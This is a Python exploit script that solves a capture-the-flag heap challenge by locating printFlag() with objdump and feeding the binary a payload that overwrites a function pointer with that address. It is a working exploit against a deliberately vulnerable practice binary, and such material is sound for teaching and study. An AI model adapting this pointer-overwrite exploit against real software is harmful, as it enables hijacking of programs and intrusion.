#!/usr/bin/env python3
import subprocess
import re
import struct

BINARY_PATH = "./CTFUaFSHAH"  # Update to match your binary's name

def main():
    # -------------------------------------------------------------------------
    # STEP 1: Find the address of printFlag() via objdump
    # -------------------------------------------------------------------------
    try:
        objdump_out = subprocess.check_output(["objdump", "-d", BINARY_PATH]).decode()
    except Exception as e:
        print(f"[-] Could not run objdump on {BINARY_PATH}: {e}")
        return

    match = re.search(r"([0-9a-fA-F]+)\s+<printFlag>:", objdump_out)
    if not match:
        print("[-] Could not find printFlag address in objdump output.")
        print("    Ensure your binary is compiled without PIE (-no-pie) and has a symbol named 'printFlag'.")
        return

    printflag_addr = int(match.group(1), 16)
    print(f"[+] Found printFlag() at address: {hex(printflag_addr)}")

    # -------------------------------------------------------------------------
    # STEP 2: Construct the payload
    #    - On 32-bit: first 4 bytes are the function pointer we want to overwrite
    #    - Then fill the rest (up to 68 bytes total) with 'A's.
    # -------------------------------------------------------------------------
    # In the C code, we do: malloc(sizeof(func_ptr) + 64) => 4 + 64 = 68 bytes
    # Then fgets(buf, 68, stdin) => so 67 bytes + 1 for null terminator
    # We overwrite the first 4 bytes with the address of printFlag().
    payload_bytes = struct.pack("<I", printflag_addr) + b"A" * 64

    print("[+] Payload constructed.")
    print(f"    Payload length: {len(payload_bytes)} bytes")

    # Print payload in hex form (useful for debugging)
    payload_hex = payload_bytes.hex()
    print("[+] Payload (hex):", payload_hex)

    # Print payload in a raw string sense (some chars may be unprintable)
    # We'll show just a truncated portion. If you want all, just print it directly.
    print("[+] Payload (raw):", repr(payload_bytes))

    # -------------------------------------------------------------------------
    # STEP 3: Run the challenge, feed the payload, and collect output
    # -------------------------------------------------------------------------
    print(f"\n[+] Running {BINARY_PATH} and sending payload...")
    proc = subprocess.Popen(
        [BINARY_PATH],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    # We add a newline so that fgets() sees an actual line of input
    output, error = proc.communicate(payload_bytes + b"\n")

    print("\n[+] Program Output:\n")
    print(output.decode(errors="replace"))  # decode to UTF-8, replacing bad chars
    if error:
        print("\n[+] Program Errors (stderr):\n")
        print(error.decode(errors="replace"))

if __name__ == "__main__":
    main()

